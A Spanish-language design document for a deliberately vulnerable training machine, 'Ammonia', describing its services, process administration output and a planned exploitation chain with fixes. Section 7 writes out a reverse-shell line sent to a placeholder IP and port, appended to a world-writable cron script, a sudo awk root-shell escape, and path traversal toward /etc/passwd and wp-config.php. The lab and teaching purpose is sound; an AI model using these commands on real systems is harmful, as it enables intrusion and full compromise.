# Desarrollo

## 1. Descripción general del sistema (Máquina: Ammonia)

#### Tipo de sistema: Servidor interno basado en el sistema operativo Ubuntu Server (Version 22.04)
#### Finalidad: Alojar la aplicación web corporativa / blog de divulgación científica.
#### Servicios principales instalados:
- Servidor web lighttpd ((MD-2)) en el puerto 7664 corriendo una instancia de WordPress ((WB-1)).
- Servidor de acceso remoto OpenSSH ((MD-1)) en el puerto estándar 22.

#### Usuarios relevantes:
- haber_fritz: Cuenta local con bajos privilegios encargada de la gestión del entorno inicial.
- clara_immerwahr: Cuenta local intermedia responsable de las tareas de automatización y almacenamiento de documentos científicos.
- root: Superusuario y administrador absoluto del sistema.

#### Vulnerabilidades creadas (Cadena de explotación):

- Inclusión de Archivos Locales (LFI): Presencia del plugin vulnerable Mail Masta en la aplicación web, lo que permite la lectura de archivos sensibles como wp-config.php y la fuga de credenciales de la base de datos.

- Reutilización de Credenciales: La clave hallada en la configuración web es válida para el acceso SSH del usuario haber_fritz.

- Permisos de Escritura Globales (777) en Tarea Cron: El script /opt/scripts/backup_notes.sh ((SC-1)) es ejecutado automáticamente por el usuario clara_immerwahr en intervalos de un minuto, pero permite su modificación por cualquier usuario del sistema.

- Configuración Laxa de Sudoers: El usuario clara_immerwahr dispone de permisos de ejecución para el binario /usr/bin/awk bajo privilegios de root sin requerir contraseña (NOPASSWD).

#### Objetivo de la auditoría: 
El auditor deberá identificar la vulnerabilidad LFI para extraer las credenciales, consolidar acceso inicial por SSH como haber_fritz, secuestrar la tarea programada modificando el script de mantenimiento para pivotar al usuario clara_immerwahr y, finalmente, abusar de la directiva de sudo mediante la técnica de escape del binario awk (GTFOBins) para comprometer totalmente el sistema obteniendo una shell como root.

## 2. Esquema de activos y recorrido de explotación

### 2.1. Esquema de activos
```bash
                                               ┌────────┐
                                               │  WEB   │
                                       ((WB-1))│  Blog  │ (WordPress)
                                               └───┬────┘ 
                                                   │ 
                                               ┌───▼────┐
                                               │lighttpd│ ((MD-2)) 
                                ┌─────────┐    └───┬────┘ 
                        ((MD-1))│ OpenSSH │        │ pt. 7664
                                └────┬────┘        │
                                     │ pt. 22      │ 
                                ┌────▼────┐    ┌───▼─────┐               
                      ((COM-1)) │   SSH   │    │  HTTP   │ ((COM-2))          
                                └─────────┘    └─────────┘      
                                     │              │      
                                     └──────┬───────┘
                                            │
                                    ┌───────▼───────┐
                     ((AC-1)) ──────│ Ubuntu Server │ ((SO-1)) 
                                    └───────────────┘
```
| **Identificador** | **Activo** | **Tipo** | **Función** | **Riesgo o Vulnerabilidad** |
|-------------------|------------|----------|-------------|------------------------------|
| **(WB-1)** | Blog (WordPress) | Aplicación / Web | Publicar el contenido web y actuar como interfaz principal del reto. | Información sensible expuesta (Inclusión de archivos locales o LFI mediante plugins vulnerables que comprometen el código). |
| **(MD-2)** | lighttpd | Middleware | Procesar las peticiones HTTP destinadas al blog en el puerto 7664. | Exposición de cabeceras o logs que agraven la fuga de datos si el servicio lee configuraciones de forma insegura. |
| **(MD-1)** | OpenSSH | Middleware | Gestionar las conexiones de consola remota segura en el puerto 22. | Abuso de canales de administración mediante credenciales obtenidas de forma ilícita (reutilización de claves). |
| **(COM-1)** | SSH | Comunicación | Canal de transporte para sesiones interactivas y comandos remotos. | Establecimiento de conexiones no autorizadas (shells reversas o directas) si el tráfico saliente/entrante no está filtrado. |
| **(COM-2)** | HTTP | Comunicación | Canal de transporte de hipertexto para la navegación web del usuario. | Intercepción o manipulación de peticiones si el canal viaja sin cifrar y se realizan ataques en la red local. |
| **(SO-1)** | Ubuntu Server | Servidor / S.O. | Alojar el núcleo del sistema, gestionar procesos y orquestar el hardware virtual. | Escalada de privilegios a nivel de kernel o explotación de malas configuraciones en la directiva global de sudoers. |
| **(AC-1)** | Usuarios y Archivos | Control de Acceso / Datos | Regular las identidades locales (haber_fritz, clara) y proteger los scripts/backups de mantenimiento. | Permisos laxos e incorrectos en el sistema de archivos (777 en scripts de Cron), permitiendo la inyección de código a usuarios no autorizados. |

### 2.2. Recorrido de explotación

```bash
[ Atacante (Kali) ]
       │
       ▼ (LFI en WordPress)
[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
       │
       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
       │
       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
[ ROOT ]
```

## 3. Administración de procesos y rendimiento

### 3.1. Identificación de procesos y servicios

```bash
haber_fritz@ammonia:~$ ps -eo pid,ppid,user,stat,%cpu,%mem,cmd | grep -E "lighttpd|ssh|cron|awk|bash|PID" | grep -v "grep"
    PID    PPID USER     STAT %CPU %MEM CMD
    861       1 root     Ss    0.0  0.1 /usr/sbin/cron -f -P
    917       1 root     Ss    0.0  0.4 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
    996       1 www-data Ss    0.0  0.1 /usr/sbin/lighttpd -D -f /etc/lighttpd/lighttpd.conf
   1472    1321 haber_f+ S+    0.0  0.2 -bash
  13066     917 root     Ss    0.0  0.5 sshd: haber_fritz [priv]
  13113   13066 haber_f+ S     0.0  0.4 sshd: haber_fritz@pts/0
  13114   13113 haber_f+ Ss    0.0  0.2 -bash
haber_fritz@ammonia:~$ pstree -p | grep -E "lighttpd|sshd|cron|bash"
           |-cron(861)
           |-lighttpd(996)---php-cgi(1026)-+-php-cgi(1044)
           |-login(1321)---bash(1472)
           |-sshd(917)---sshd(13066)---sshd(13113)---bash(13114)-+-grep(13149)
haber_fritz@ammonia:~$ systemctl list-units --type=service --state=running | grep -E "lighttpd|ssh|cron"
  cron.service                loaded active running Regular background program processing daemon
  lighttpd.service            loaded active running Lighttpd Daemon
  ssh.service                 loaded active running OpenBSD Secure Shell server
haber_fritz@ammonia:~$ uptime && free -h && vmstat 1 3
 17:29:11 up 8 min,  2 users,  load average: 0.01, 0.09, 0.05
               total        used        free      shared  buff/cache   available
Mem:           1.9Gi       385Mi       712Mi       3.0Mi       829Mi       1.3Gi
Swap:          2.0Gi       0.0Ki       2.0Gi
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 0  0    524 729212  35324 814372    0    0   916  1121  164  310  2  2 95  0  0
 0  0    524 729212  35332 814372    0    0     0    64  115  160  0  0 100  0  0
 0  0    524 729212  35332 814372    0    0     0     0   93  150  0  0 100  0  0
```

| PID | PPID | Usuario | Servicio / Comando | Estado | Rol en el Escenario |
|-----|------|---------|-------------------|--------|---------------------|
| 9961 | 1 | www-data | `/usr/sbin/lighttpd` | Ss (Activo) | **Necesario**. Aloja el blog ((WB-1)) e hilos php-cgi (1026). Vector de acceso inicial (LFI). |
| 9171 | 1 | root | `/usr/sbin/sshd -D` | Ss (Activo) | **Necesario**. Listener maestro de SSH ((MD-1)). Gestiona la intrusión perimetral. |
| 8611 | 1 | root | `/usr/sbin/cron -f -P` | Ss (Activo) | **Necesario**. Demonio de tareas programadas. Orquesta el movimiento lateral. |
| 13114 | 13113 | haber_fritz | `-bash` | Ss (Activo) | **Proceso de sesión interactiva actual** vinculada a la consola pts/0. |

- Relación Padre-Hijo: El demonio sshd maestro (PID 917) bifurca un proceso privilegiado controlado por root (PID 13066) al recibir la conexión, el cual genera la sesión secundaria del usuario (PID 13113) para finalmente invocar el intérprete /bin/bash (PID 13114) del auditor. De igual manera, lighttpd (PID 996) actúa como proceso padre de la infraestructura de procesamiento dinámico php-cgi (PID 1026).

- Servicios prescindibles: En un entorno endurecido (hardening), servicios no críticos de red o interfaces gráficas podrían desactivarse; sin embargo, en este despliegue, la tríada lighttpd.service, ssh.service y cron.service es estrictamente mandatoria para preservar la cadena de explotación.

- Consumo de Recursos: El sistema presenta un uso de memoria volátil optimizado, consumiendo únicamente 385 MiB de los 1.9 GiB totales disponibles, manteniendo más de 1.3 GiB en estado disponible y una tasa de uso de Swap nula (0.0 KiB).

- Carga de CPU: De acuerdo con las métricas de vmstat, el procesador opera con un porcentaje de tiempo inactivo (idle) de entre el 95% y 100%, registrando un promedio de carga (load average) mínimo de 0.01 a un minuto del arranque (uptime).

- Cumplimiento del Plan: El rendimiento cumple con los requisitos del proyecto. Los bajos tiempos de respuesta del procesador y la holgura de la memoria RAM garantizan que la ejecución periódica del cron por parte de Clara y los procesos interactivos de la reverse shell se ejecuten de forma fluida y sin demoras (delays), impidiendo la caída de servicios durante la intrusión.

### 3.2. Intervención sobre un servicio

```bash
haber_fritz@ammonia:~$ sudo systemctl status cron
[sudo] password for haber_fritz:
● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2026-07-18 17:20:56 UTC; 16min ago
       Docs: man:cron(8)
   Main PID: 861 (cron)
      Tasks: 1 (limit: 2172)
     Memory: 3.1M
        CPU: 220ms
     CGroup: /system.slice/cron.service
             └─861 /usr/sbin/cron -f -P

Jul 18 17:33:01 ammonia CRON[13175]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:34:01 ammonia CRON[13181]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:34:01 ammonia CRON[13182]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:34:01 ammonia CRON[13181]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:35:01 ammonia CRON[13187]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:35:01 ammonia CRON[13188]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:35:01 ammonia CRON[13187]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:36:01 ammonia CRON[13218]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session closed for user clara_immerwahr
lines 1-21/21 (END)
haber_fritz@ammonia:~$ sudo systemctl stop cron
haber_fritz@ammonia:~$ sudo systemctl status cron
○ cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: inactive (dead) since Sat 2026-07-18 17:37:12 UTC; 4s ago
       Docs: man:cron(8)
    Process: 861 ExecStart=/usr/sbin/cron -f -P $EXTRA_OPTS (code=killed, signal=TERM)
   Main PID: 861 (code=killed, signal=TERM)
        CPU: 234ms

Jul 18 17:35:01 ammonia CRON[13187]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:36:01 ammonia CRON[13218]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:37:01 ammonia CRON[13240]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:37:01 ammonia CRON[13241]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:37:01 ammonia CRON[13240]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:37:12 ammonia systemd[1]: Stopping Regular background program processing daemon...
Jul 18 17:37:12 ammonia systemd[1]: cron.service: Deactivated successfully.
Jul 18 17:37:12 ammonia systemd[1]: Stopped Regular background program processing daemon.
lines 1-18/18 (END)
haber_fritz@ammonia:~$ sudo systemctl start cron
haber_fritz@ammonia:~$ sudo systemctl status cron
● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2026-07-18 17:37:22 UTC; 6s ago
       Docs: man:cron(8)
   Main PID: 13258 (cron)
      Tasks: 1 (limit: 2172)
     Memory: 340.0K
        CPU: 2ms
     CGroup: /system.slice/cron.service
             └─13258 /usr/sbin/cron -f -P

Jul 18 17:37:22 ammonia systemd[1]: Started Regular background program processing daemon.
Jul 18 17:37:22 ammonia cron[13258]: (CRON) INFO (pidfile fd = 3)
Jul 18 17:37:22 ammonia cron[13258]: (CRON) INFO (Skipping @reboot jobs -- not system startup)
```
### 3.3. Modificación de la prioridad de un proceso

```bash
haber_fritz@ammonia:~$ bash -c "exec -a ammonia-sensor-mock sleep 300" &
[5] 13376
haber_fritz@ammonia:~$ ps -o pid,ppid,user,stat,ni,cmd -p 13376
    PID    PPID USER     STAT  NI CMD
  13376   13114 haber_f+ S      0 ammonia-sensor-mock 300
haber_fritz@ammonia:~$ renice 10 -p 13376
13376 (process ID) old priority 0, new priority 10
haber_fritz@ammonia:~$ ps -o pid,ppid,user,stat,ni,cmd -p 13376
    PID    PPID USER     STAT  NI CMD
  13376   13114 haber_f+ SN    10 ammonia-sensor-mock 300
haber_fritz@ammonia:~$ kill 13376
```

- Proceso utilizado: Se instanció un proceso en segundo plano camuflado en memoria bajo el nombre descriptivo de ammonia-sensor-mock (PID 13376), simulando un capturador de telemetría o sensor químico del laboratorio.

- Prioridad inicial y asignada: El proceso nació con una prioridad estándar o factor Nice inicial de 0 (estado S, suspendido de forma ejecutable). Mediante la llamada de administración renice 10 -p 13376, se modificó su comportamiento asignándole un Nice final de 10. En el segundo control de estado, la columna STAT mutó a SN, donde la bandera N (low-priority nice) confirma que el planificador ha degradado con éxito la prioridad del hilo.

- Efecto del valor Nice: El factor Nice define la tolerancia de un proceso frente al resto en una escala de -20 (máxima prioridad, requiere privilegios de root) a 19 (mínima prioridad). Al elevar el valor a 10, se le indica al sistema operativo que le otorgue menos ráfagas de tiempo de CPU (time-slices) si el servidor entra en alta carga, evitando que un script de monitorización comprometa el rendimiento de servicios críticos del reto como lighttpd o sshd.

- Finalización del proceso: Una vez validadas las directivas de control, el proceso se concluyó de forma limpia enviando la señal estándar SIGTERM (15) mediante el comando kill 13376, liberando inmediatamente el identificador de la tabla del sistema operativo.

## 4. Administración del almacenamiento

## 5. Administración de usuarios, permisos y accesos

## 6. Evaluación de servicios de comunicaciones

## 7. Vulnerabilidades implementadas

### 7.1. Vulnerabilidad de Acceso Inicial: Plugin Vulnerable (Mail Masta - LFI) (CVE-2016-10956)

- Activo afectado: ((WB-1)) Blog (WordPress) / ((MD-2)) lighttpd (Puerto 7664).

- Configuración que  la provoca: La instalación y activación del plugin desactualizado Mail Masta (versión 1.0), el cual carece de sanitización en sus parámetros de entrada (específicamente en variables de inclusión de archivos).

- Riesgo que  representa: Permite a un atacante no autenticado evadir los controles de acceso a archivos del servidor web y leer archivos arbitrarios internos del sistema operativo (Local File Inclusion).

- Cómo puede explotarse: Mediante el envío de una petición HTTP manipulada que utilice secuencias de salto de directorio (../../../../etc/passwd) a través del parámetro vulnerable del plugin para forzar al servidor a renderizar el contenido de archivos locales del sistema de archivos, tales como /etc/passwd o wp-config.php.

- Impacto: Crítico. Fuga de información confidencial y exposición de las credenciales de texto plano de la base de datos de WordPress, las cuales se reutilizan en el servicio SSH.

- Cómo se corregiría en un sistema real: Desinstalar de inmediato el plugin Mail Masta o actualizarlo a una versión parcheada que sanitice las entradas del usuario. Implementar directivas estrictas en la configuración de PHP (allow_url_fopen = Off y allow_url_include = Off).

### 7.2. Escalada de Privilegios (Movimiento Lateral): Tarea Cron Modificable

- Activo afectado: ((AC-1)) Usuarios y Archivos / Script de mantenimiento /opt/scripts/backup_notes.sh.

- Configuración que  la provoca: Una asignación laxa e incorrecta de privilegios en el sistema de archivos (chmod 777) sobre el script de copia de seguridad, sumado a una tarea programada en el archivo general /etc/crontab que ejecuta dicho script cada minuto bajo el contexto del usuario clara_immerwahr.

- Riesgo que  representa: Permite la inyección y ejecución de código arbitrario. Cualquier usuario con acceso local de bajos privilegios puede modificar el comportamiento del script.

- Cómo puede explotarse: El usuario inicial haber_fritz concatena una línea de comandos al final del archivo aprovechando su permiso de escritura (echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" >> /opt/scripts/backup_notes.sh). Al cumplirse el minuto, el demonio Cron procesa el archivo e inicia una conexión inversa automatizada.

- Impacto: Alto. Suplantación y toma de control horizontal de la identidad de la usuaria intermedia clara_immerwahr, obteniendo acceso directo a sus documentos e historial.

- Cómo se corregiría en un sistema real: Aplicar el principio de mínimo privilegio sobre el archivo de mantenimiento, eliminando el permiso de escritura para el resto de usuarios del sistema mediante el comando chmod 755 /opt/scripts/backup_notes.sh o asignando la propiedad estricta a su ejecutor legítimo.

### 7.3. Escalada de Privilegios (Máxima): Configuración Insegura de Sudo (awk)

- Activo afectado: ((SO-1)) Ubuntu Server / Reglas de Sudoers.

- Configuración que la provoca: La inclusión de una regla permisiva en el archivo de configuración /etc/sudoers que autoriza explícitamente a la cuenta clara_immerwahr a ejecutar el binario del sistema /usr/bin/awk con privilegios de administrador sin requerir autenticación (NOPASSWD:).

- Riesgo que representa: Evasión total de los controles de restricción de privilegios. El binario permitido cuenta con funciones nativas que permiten invocar intérpretes de comandos secundarios (shells).

- Cómo puede explotarse: Una vez que el auditor se encuentra en la sesión de Clara, invoca el binario abusando de la propiedad de ejecución de comandos interactivos (GTFOBins) mediante la sentencia: sudo awk 'BEGIN {system("/bin/sh")}'.

- Impacto: Crítico. Compromiso total y absoluto del servidor virtual. El auditor obtiene acceso directo como el superusuario root, logrando persistencia, lectura y modificación de cualquier recurso del sistema operativo.

- Cómo se corregiría en un sistema real: Revocar la directiva NOPASSWD para comandos que dispongan de funciones de escape integradas. Si es estrictamente necesario delegar la tarea a awk, estructurar scripts específicos firmados o restringir sus argumentos mediante alias de comandos específicos en /etc/sudoers para evitar la inyección de la función system().

### 7.4. Flags

- usuario #1 (haber_fritz) : aber_fritz@ammonia:~/.secret/backup$ 'Proceso Haber-Bosch para la producción de amoníaco.zip'
- usuario #2 (clara_immerwahr) : /documents/conflicto_etico$ cat .clara_ultimas_palabras
- usuario #3 (root.txt) : root@ammonia:/# unzip -p sintesis_catalitica_amonio.zip
  
## 8. Write-up de resolución
- [Write-up de resolución](ruta-explotacion.md)
  
## 9. Credenciales white box
- [Credenciales white box](credenciales-white-box.md)



